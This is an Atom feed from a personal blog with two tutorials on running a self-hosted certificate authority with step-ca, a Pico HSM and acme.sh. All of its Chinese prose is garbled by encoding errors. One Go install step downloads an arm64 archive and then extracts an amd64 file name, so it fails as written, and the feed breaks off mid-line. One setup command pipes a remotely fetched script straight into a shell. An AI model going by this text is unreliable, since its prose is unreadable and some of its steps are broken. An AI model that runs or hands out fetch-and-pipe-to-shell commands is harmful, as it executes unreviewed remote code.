<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ThinkAlone</title>
  
  <subtitle>In solitude where we are least alone. ----Lord Byron</subtitle>
  <link href="https://thinkalone.win/atom.xml" rel="self"/>
  
  <link href="https://thinkalone.win/"/>
  <updated>2026-01-09T04:00:00.000Z</updated>
  <id>https://thinkalone.win/</id>
  
  <author>
    <name>Disappear9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>çµè½¦ï¼å¼€åˆ›ï¼ Step-CA æ—¥å¸¸ä½¿ç”¨æ•™ç¨‹</title>
    <link href="https://thinkalone.win/Using-step-ca.html"/>
    <id>https://thinkalone.win/Using-step-ca.html</id>
    <published>2026-01-09T04:00:00.000Z</published>
    <updated>2026-01-09T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>å‰å‡ å¤©æ€»ç®—æŠ½ç©ºæŠŠå’•äº†å¿«ä¸€å¹´çš„è‡ªå»ºçµè½¦CAçš„æ•™ç¨‹å†™å®Œäº†ï¼š<a href="https://thinkalone.win/build-ca-with-picohsm.html">ä½¿ç”¨ Pico HSM å’Œ step-ca è‡ªå»ºä¸€ä¸ªCA</a><br>å»ºå®Œä»¥åæ€»æ˜¯è¦æ‹¿æ¥ç”¨ä¸€ç”¨ç©ä¸€ç©çš„ï¼Œé‚£ä¹ˆè¿™ä¸€ç¯‡å¹…å°±å†™ä¸€äº› Step-CA çš„ä½¿ç”¨æ•™ç¨‹å§ï¼Œé¡ºä¾¿ä¹Ÿç»™è‡ªå·±ç•™ä¸ªå‚è€ƒã€‚  </p><hr><span id="more"></span> <h3 id="ACME"><a href="#ACME" class="headerlink" title="ACME"></a>ACME</h3><h4 id="ä¿®æ”¹é»˜è®¤é…ç½®"><a href="#ä¿®æ”¹é»˜è®¤é…ç½®" class="headerlink" title="ä¿®æ”¹é»˜è®¤é…ç½®"></a>ä¿®æ”¹é»˜è®¤é…ç½®</h4><p>ä¸ºäº†å®‰å…¨ Step-CA é»˜è®¤ç­¾å‡ºçš„è¯ä¹¦åªæœ‰24å°æ—¶çš„æœ‰æ•ˆæœŸï¼Œè¿™å¯¹äºæˆ‘ä»¬æ¥è¯´æ˜¯å®Œå…¨æ²¡æœ‰å¿…è¦çš„ï¼Œå…ˆæ¥æŠŠå®ƒä¿®æ”¹åˆ°7å¤©  </p><p>ç¼–è¾‘<code>step-ca/config/ca.json</code>  </p><figure class="highlight json"><figcaption><span>ca.json</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ACME&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;acme&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;claims&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;maxTLSCertDuration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;336h&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;minTLSCertDuration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;24h&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;defaultTLSCertDuration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;168h&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å¼€å¯CRLåŠŸèƒ½  </p><p>ç¼–è¾‘ <code>step-ca/config/ca.json</code>  </p><figure class="highlight json"><figcaption><span>ca.json</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;insecureAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;:9001&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;crl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;idpURL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://ca.lab.d9lab.eu.org/1.0/crl&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ¨¡æ¿ <code>/etc/step-ca/templates/x509/leaf.tpl</code>  </p><figure class="highlight json"><figcaption><span>leaf.tpl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;subject&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="punctuation">&#123;</span> toJson .Subject <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sans&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="punctuation">&#123;</span> toJson .SANs <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span> <span class="punctuation">&#123;</span>- if typeIs <span class="string">&quot;*rsa.PublicKey&quot;</span> .Insecure.CR.PublicKey <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="attr">&quot;keyUsage&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;keyEncipherment&quot;</span><span class="punctuation">,</span> <span class="string">&quot;digitalSignature&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span> <span class="punctuation">&#123;</span>- else <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="attr">&quot;keyUsage&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;digitalSignature&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span> <span class="punctuation">&#123;</span>- end <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="attr">&quot;extKeyUsage&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;serverAuth&quot;</span><span class="punctuation">,</span> <span class="string">&quot;clientAuth&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;crlDistributionPoints&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;http://ca.lab.d9lab.eu.org/1.0/crl&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç¼–è¾‘ <code>step-ca/config/ca.json</code><br>è®¾ç½®acmeå’ŒJWK provisionerä½¿ç”¨æ¨¡æ¿  </p><figure class="highlight json"><figcaption><span>ca.json</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">                        <span class="attr">&quot;claims&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;maxTLSCertDuration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;336h&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;minTLSCertDuration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;24h&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;defaultTLSCertDuration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;168h&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;x509&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;templateFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/etc/step-ca/templates/x509/leaf.tpl&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;ssh&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">......</span><br><span class="line">                        <span class="attr">&quot;claims&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;enableSSHCA&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;disableRenewal&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;allowRenewalAfterExpiry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;disableSmallstepExtensions&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;x509&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;templateFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/etc/step-ca/templates/x509/leaf.tpl&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;ssh&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="ç»™è®¾å¤‡å‘SSLè¯ä¹¦"><a href="#ç»™è®¾å¤‡å‘SSLè¯ä¹¦" class="headerlink" title="ç»™è®¾å¤‡å‘SSLè¯ä¹¦"></a>ç»™è®¾å¤‡å‘SSLè¯ä¹¦</h4><p>å…¶ä»–ACMEå®¢æˆ·ç«¯å¯ä»¥å‚è€ƒï¼š<a href="https://smallstep.com/docs/tutorials/acme-protocol-acme-clients/#popular-acme-clients">Popular ACME Clients</a><br>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<a href="https://github.com/acmesh-official/acme.sh">acme.sh</a>ï¼Œä¸»æ‰“ä¸€ä¸ªå°è€Œç¾ã€‚  </p><p>å‡è®¾æˆ‘è¦ç»™æˆ‘å†…ç½‘çš„æ—è·¯ç”±ï¼ˆOpenWRTï¼‰ç­¾ä¸€ä¸ªè¯ä¹¦  </p><p>ç”±äºæˆ‘ä»¬çš„è‡ªå»ºCAä¸åœ¨ç³»ç»Ÿçš„ä¿¡ä»»æ ¹è¯ä¹¦åˆ—è¡¨é‡Œï¼Œæ‰€ä»¥å¦‚æœç›´æ¥è¿è¡Œacme.shï¼Œcurlä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬éœ€è¦æŠŠroot_ca.crtå¤åˆ¶ä¸€ä»½åˆ°è®¾å¤‡ä¸Šã€‚  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†root_ca.crtå¤åˆ¶åˆ°/root/certs/root_ca.crt</span></span><br><span class="line"><span class="comment"># å®‰è£…acme.sh</span></span><br><span class="line">$ curl https://get.acme.sh | sh -s email=my@example.com</span><br><span class="line"></span><br><span class="line">$ ~/.acme.sh/acme.sh --issue -d router2.d9lab.eu.org \</span><br><span class="line">--server https://ca.lab.thinkalone.win:4443/acme/acme/directory \</span><br><span class="line">--ca-bundle /root/certs/root_ca.crt \</span><br><span class="line">--webroot /www --days 6 --reloadcmd <span class="string">&quot;service uhttpd reload&quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶åç¼–è¾‘<code>/etc/config/uhttpd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">#è®©uhttpdç›‘å¬443ç«¯å£</span></span><br><span class="line">        list listen_https <span class="string">&#x27;0.0.0.0:443&#x27;</span></span><br><span class="line">        list listen_https <span class="string">&#x27;[::]:443&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">#å°†certå’Œkeyçš„è·¯å¾„æ”¹åˆ°ä¸Šé¢acme.shè„šæœ¬è¾“å‡ºçš„</span></span><br><span class="line">        option cert <span class="string">&#x27;/root/.acme.sh/router2.d9lab.eu.org_ecc/router2.d9lab.eu.org.cer&#x27;</span></span><br><span class="line">        option key <span class="string">&#x27;/root/.acme.sh/router2.d9lab.eu.org_ecc/router2.d9lab.eu.org.key&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ï¼ˆå®Œï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‰å‡ å¤©æ€»ç®—æŠ½ç©ºæŠŠå’•äº†å¿«ä¸€å¹´çš„è‡ªå»ºçµè½¦CAçš„æ•™ç¨‹å†™å®Œäº†ï¼š&lt;a href=&quot;https://thinkalone.win/build-ca-with-picohsm.html&quot;&gt;ä½¿ç”¨ Pico HSM å’Œ step-ca è‡ªå»ºä¸€ä¸ªCA&lt;/a&gt;&lt;br&gt;å»ºå®Œä»¥åæ€»æ˜¯è¦æ‹¿æ¥ç”¨ä¸€ç”¨ç©ä¸€ç©çš„ï¼Œé‚£ä¹ˆè¿™ä¸€ç¯‡å¹…å°±å†™ä¸€äº› Step-CA çš„ä½¿ç”¨æ•™ç¨‹å§ï¼Œé¡ºä¾¿ä¹Ÿç»™è‡ªå·±ç•™ä¸ªå‚è€ƒã€‚  &lt;/p&gt;
&lt;hr&gt;</summary>
    
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>çµä¸ŠåŠ çµï¼šä½¿ç”¨ Pico HSM å’Œ step-ca è‡ªå»ºä¸€ä¸ªCA</title>
    <link href="https://thinkalone.win/build-ca-with-picohsm.html"/>
    <id>https://thinkalone.win/build-ca-with-picohsm.html</id>
    <published>2025-12-10T04:00:00.000Z</published>
    <updated>2026-01-08T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h3><p>å‰å‡ å¤©åœ¨Canokeyç¾¤çœ‹åˆ°ä¸€ä¸ªè½¯ä»¶ï¼š<a href="https://github.com/smallstep/certificates">step-ca</a><br>ç®€å•è¯´å°±æ˜¯ç”¨è¿™ä¸ªè½¯ä»¶å¯ä»¥è‡ªå»ºä¸€ä¸ªCAæ¥ç©ï¼Œè€Œä¸”è½¯ä»¶æ”¯æŒHSMè®¾å¤‡</p><hr><h3 id="ç¯å¢ƒç¡®è®¤"><a href="#ç¯å¢ƒç¡®è®¤" class="headerlink" title="ç¯å¢ƒç¡®è®¤"></a>ç¯å¢ƒç¡®è®¤</h3><p>ç¡¬ä»¶ä¿¡æ¯ï¼š<br>&emsp;&emsp;OrangePi Zero3<br>&emsp;&emsp;Raspberry Pi Pico2<br>æ“ä½œç³»ç»Ÿï¼š<br>&emsp;&emsp;Armbian v25.11.2 6.12.58-current-sunxi64<br>è½¯ä»¶ç‰ˆæœ¬ï¼š<br>&emsp;&emsp;go1.25.5<br>&emsp;&emsp;step-ca 0.29.0<br>&emsp;&emsp;OpenSC 0.26.1  </p><span id="more"></span> <h3 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h3><h4 id="å®‰è£…Go"><a href="#å®‰è£…Go" class="headerlink" title="å®‰è£…Go"></a>å®‰è£…Go</h4><p><a href="https://go.dev/doc/install">https://go.dev/doc/install</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://go.dev/dl/go1.25.5.linux-arm64.tar.gz</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">rm</span> -rf /usr/local/go &amp;&amp; <span class="built_in">sudo</span> tar -C /usr/local -xzf go1.25.5.linux-amd64.tar.gz</span><br><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/go/bin</span><br><span class="line">$ go version</span><br><span class="line">go version go1.25.5 linux/arm64</span><br></pre></td></tr></table></figure><h4 id="ç¼–è¯‘-step-ca"><a href="#ç¼–è¯‘-step-ca" class="headerlink" title="ç¼–è¯‘ step-ca"></a>ç¼–è¯‘ step-ca</h4><p>ç”±äºå®˜æ–¹ç¼–è¯‘çš„è½¯ä»¶åŒ…æ²¡æœ‰HSMæ”¯æŒï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ç¼–è¯‘  </p><p><a href="https://github.com/smallstep/certificates/blob/master/CONTRIBUTING.md#build-step-ca-using-cgo">https://github.com/smallstep/certificates/blob/master/CONTRIBUTING.md#build-step-ca-using-cgo</a>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://github.com/smallstep/certificates/archive/refs/tags/v0.29.0.tar.gz</span><br><span class="line">$ tar -xvzf v0.29.0.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> certificates-0.29.0</span><br><span class="line">$ <span class="built_in">sudo</span> apt install libpcsclite-dev gcc make pkg-config</span><br><span class="line">$ make bootstrap</span><br><span class="line">$ make build GO_ENVS=<span class="string">&quot;CGO_ENABLED=1&quot;</span></span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">cp</span> bin/step-ca /usr/local/bin</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">setcap</span> CAP_NET_BIND_SERVICE=+eip /usr/local/bin/step-ca</span><br><span class="line">$ step-ca version</span><br><span class="line">Smallstep CA/ (linux/arm64)</span><br><span class="line">Release Date: 2025-12-03 14:16 UTC</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…-step-cli-å’Œ-step-kms-plugin"><a href="#å®‰è£…-step-cli-å’Œ-step-kms-plugin" class="headerlink" title="å®‰è£… step-cli å’Œ step-kms-plugin"></a>å®‰è£… step-cli å’Œ step-kms-plugin</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://dl.smallstep.com/gh-release/cli/gh-release-header/v0.29.0/step-cli_0.29.0-1_arm64.deb</span><br><span class="line">$ <span class="built_in">sudo</span> dpkg -i step-cli_0.29.0-1_arm64.deb</span><br><span class="line">$ step version</span><br><span class="line">Smallstep CLI/0.29.0 (linux/arm64)</span><br><span class="line">Release Date: 2025-12-03T04:11:27Z</span><br><span class="line">$ wget https://github.com/smallstep/step-kms-plugin/releases/download/v0.16.0/step-kms-plugin_0.16.0-1_arm64.deb</span><br><span class="line">$ <span class="built_in">sudo</span> dpkg -i step-kms-plugin_0.16.0-1_arm64.deb</span><br><span class="line">$ step kms version</span><br><span class="line">ğŸ” step-kms-plugin/0.16.0 (linux/arm64)</span><br><span class="line">   Release Date: 2025-12-04T22:35:43Z</span><br></pre></td></tr></table></figure><h4 id="ç¼–è¯‘-OpenSC"><a href="#ç¼–è¯‘-OpenSC" class="headerlink" title="ç¼–è¯‘ OpenSC"></a>ç¼–è¯‘ OpenSC</h4><p><a href="https://github.com/OpenSC/OpenSC/wiki/Compiling-and-Installing-on-Unix-flavors">https://github.com/OpenSC/OpenSC/wiki/Compiling-and-Installing-on-Unix-flavors</a>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://github.com/OpenSC/OpenSC/releases/download/0.26.1/opensc-0.26.1.tar.gz</span><br><span class="line">$ <span class="built_in">sudo</span> apt install pcscd libccid libpcsclite-dev libssl-dev libreadline-dev autoconf automake build-essential docbook-xsl xsltproc libtool pkg-config zlib1g-dev </span><br><span class="line">$ tar xfvz opensc-0.26.1.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> opensc-0.26.1</span><br><span class="line">$ ./bootstrap</span><br><span class="line">$ ./configure --prefix=/usr --sysconfdir=/etc/opensc</span><br><span class="line">$ make</span><br><span class="line">$ <span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure><h4 id="é…ç½®-TRNG-ï¼ˆå¯é€‰ï¼‰"><a href="#é…ç½®-TRNG-ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="é…ç½® TRNG ï¼ˆå¯é€‰ï¼‰"></a>é…ç½® TRNG ï¼ˆå¯é€‰ï¼‰</h4><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯ <a href="https://github.com/leetronics/infnoise">Infinite Noise TRNG</a> å…¨å¼€æºçš„ç¡¬ä»¶TRNG</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ curl -LO https://github.com/leetronics/infnoise/archive/refs/tags/0.3.3.tar.gz</span><br><span class="line">$ tar xvzf 0.3.3.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> infnoise-0.3.3/software</span><br><span class="line">$ <span class="built_in">sudo</span> apt install libftdi-dev libusb-dev</span><br><span class="line">$ make -f Makefile.linux</span><br><span class="line">$ <span class="built_in">sudo</span> make -f Makefile.linux install</span><br><span class="line">$ infnoise --version</span><br><span class="line">GIT VERSION -</span><br><span class="line">GIT COMMIT  -</span><br><span class="line">GIT DATE    -</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">sudo</span> init 6</span><br><span class="line">$ infnoise --debug --no-output</span><br><span class="line">Generated 1048576 bits.  OK to use data.  Estimated entropy per bit: 0.875965, estimated K: 1.835235</span><br><span class="line">num1s:50.019069%, even misfires:0.183222%, odd misfires:0.123520%</span><br><span class="line">Generated 2097152 bits.  OK to use data.  Estimated entropy per bit: 0.873196, estimated K: 1.831716</span><br><span class="line">num1s:49.909786%, even misfires:0.202971%, odd misfires:0.124232%</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h4 id="çƒ§å½•-pico-hsm-åˆ°-Pico2"><a href="#çƒ§å½•-pico-hsm-åˆ°-Pico2" class="headerlink" title="çƒ§å½• pico-hsm åˆ° Pico2"></a>çƒ§å½• pico-hsm åˆ° Pico2</h4><p><a href="https://github.com/polhenarejos/pico-hsm">https://github.com/polhenarejos/pico-hsm</a><br><a href="https://github.com/Gadgetoid/pico-universal-flash-nuke">https://github.com/Gadgetoid/pico-universal-flash-nuke</a>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://github.com/polhenarejos/pico-hsm/releases/download/v6.0/pico_hsm_pico2-6.0.uf2</span><br><span class="line">$ wget https://github.com/Gadgetoid/pico-universal-flash-nuke/releases/download/v1.0.1/universal_flash_nuke.uf2</span><br></pre></td></tr></table></figure><p>æŒ‰ä½ Pico2 å¼€å‘æ¿ä¸Šçš„ BOOT æŒ‰é’®ï¼Œè¿ä¸Š USB çº¿ï¼Œå…ˆåˆ·å…¥<code>universal_flash_nuke.uf2</code>æ¸…ç©ºFlashï¼Œå†åˆ·å…¥<code>pico_hsm_pico2-6.0.uf2</code></p><h4 id="åˆå§‹åŒ–-pico-hsm"><a href="#åˆå§‹åŒ–-pico-hsm" class="headerlink" title="åˆå§‹åŒ– pico-hsm"></a>åˆå§‹åŒ– pico-hsm</h4><p>æ›´æ–°ï¼šç›®å‰å¦‚æœè¦ä½¿ç”¨SCS3 toolå¯¼å…¥è¯ä¹¦ï¼Œåªèƒ½ä½¿ç”¨PicoCommissioneråˆå§‹åŒ–ï¼Œå¦åˆ™ä¼šå¯¼è‡´SCS3ä¸€ç›´æŠ¥è®¤è¯é”™è¯¯ã€‚<br>æ›´æ–°2ï¼šè¿™Bä½œè€…æŠŠPico Commissionerçš„é¡µé¢å’Œpypicohsmç­‰å·¥å…·å…¨åˆ äº†ï¼Œç°æœ‰çš„ç½‘é¡µå­˜æ¡£ä¹Ÿè¢«ä½œè€…ä¸‹äº†ï¼Œç„¶åå¼ºåˆ¶ç”¨æˆ·ä½¿ç”¨ä¸€ä¸ªæ–°çš„éœ€è¦ä»˜è´¹30æ¬§å…ƒæ¯ä¸ªKeyçš„åº”ç”¨æ¥åˆå§‹åŒ–ã€‚<br>æ›´æ–°3ï¼šæœ‰ä¸ªå°åº¦è€å“¥åšäº†åˆ†å‰<a href="https://github.com/librekeys">Libre Keys</a>ï¼Œå¤§éƒ¨åˆ†å·¥å…·å¦‚pypicohsmç­‰éƒ½å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½äº†ã€‚  </p><div class="tabs my-3 is-fullwidth">        <ul class="mx-0 my-0">            <li>          <a href="#init-pico-hsm-py">              <p>pico-hsm-tool.py</p>          </a>      </li><li class="is-active">          <a href="#init-pico-hsm-commissioner">              <p>PicoCommissionerï¼ˆå·²å¤±æ•ˆï¼‰</p>          </a>      </li>        </ul>    </div>    <div id="init-pico-hsm-py" class="tab-content is-hidden">          <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt install python3-dev</span><br><span class="line">$ wget https://github.com/polhenarejos/pico-hsm/raw/refs/heads/master/tools/pico-hsm-tool.py</span><br><span class="line">$ python3 -m venv venv</span><br><span class="line">$ <span class="built_in">source</span> venv/bin/activate</span><br><span class="line">$ pip install pycvc cryptography pypicohsm</span><br><span class="line">$ python3 pico-hsm-tool.py</span><br><span class="line">$ deactivate</span><br></pre></td></tr></table></figure><p>æ›´æ”¹pico-hsmçš„vidå’Œpid  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> -i</span><br><span class="line">$ <span class="built_in">source</span> venv/bin/activate</span><br><span class="line">$ python pico-hsm-tool.py phy vidpid 20A0:4230</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">$ lsusb</span><br><span class="line">Bus 006 Device 003: ID 20a0:4230 Clay Logic Nitrokey HSM</span><br><span class="line">Bus 006 